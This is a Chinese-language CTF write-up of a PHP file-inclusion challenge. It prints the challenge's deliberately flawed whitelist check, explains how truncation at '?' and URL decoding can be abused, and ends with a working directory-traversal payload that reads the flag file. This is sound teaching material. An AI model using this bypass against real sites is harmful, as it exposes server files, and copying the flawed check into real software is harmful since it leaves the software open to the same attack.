## include() 目录穿越

查看页面源代码，发现 `source.php`，接下来我们访问 `source.php` 拿到源码

```php
<?php
    highlight_file(__FILE__);
    class emmm
    {
        public static function checkFile(&$page)
        {
            $whitelist = ["source"=>"source.php","hint"=>"hint.php"];
            if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }

            if (in_array($page, $whitelist)) {
                return true;
            }

            $_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }

            $_page = urldecode($page);
            $_page = mb_substr(
                $_page,
                0,
                mb_strpos($_page . '?', '?')
            );
            if (in_array($_page, $whitelist)) {
                return true;
            }
            echo "you can't see it";
            return false;
        }
    }

    if (! empty($_REQUEST['file'])
        && is_string($_REQUEST['file'])
        && emmm::checkFile($_REQUEST['file'])
    ) {
        include $_REQUEST['file'];
        exit;
    } else {
        echo "<br><img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />";
    }  
?>
```

查看 hint.php，发现

```
flag not here, and flag in ffffllllaaaagggg
```

传入 `file=hint.php`，首先检查 `hint.php` 是否是一个字符串，它是字符串，条件通过

```php
if (! isset($page) || !is_string($page)) {
                echo "you can't see it";
                return false;
            }
```

检查 `hint.php` 是否在白名单中（白名单包括 `hint.php` 和 `source.php`），在，继续执行后面的代码

```php
if (in_array($page, $whitelist)) {
                return true;
            }
```

对 `hint.php` 执行 `mb_substr()` 函数，但是函数内一个参数是来自另一个函数 `mb_strpos()` 的返回值，因此我们先看`mb_strpos()` 函数

使用 `.` 进行字符连接，即连接了一个问号字符 `?`，得到 `hint.php?`

然后查找 `?` '在字符串 `hint.php?` 中第一次出现的位置，从 0 开始算，返回 8，即 length=8

```php
mb_strpos($page . '?', '?')
```

接下来我们执行 `mb_substr()` 函数，即 `mb_substr('hint.php',0,8)`

从字符串中的第一个字符处开始，返回 8 个字符，其实还是返回的 `hint.php`；

```php
$_page = mb_substr(
                $page,
                0,
                mb_strpos($page . '?', '?')
            );
```

然后对返回的内容进行 URL 解码，重复执行上面的检查和截取操作

```php
$_page = urldecode($page);
```

我们只需要传入一个在白名单内的文件名（`source.php` 或者 `hint.php`），并添加上问号，这样可以保证每次找去用于检查的内容都在白名单，返回 true

```php
source.php?file=hint.php?/../../../../ffffllllaaaagggg
```

![](https://pic1.imgdb.cn/item/68c0f0da58cb8da5c89442a2.png)
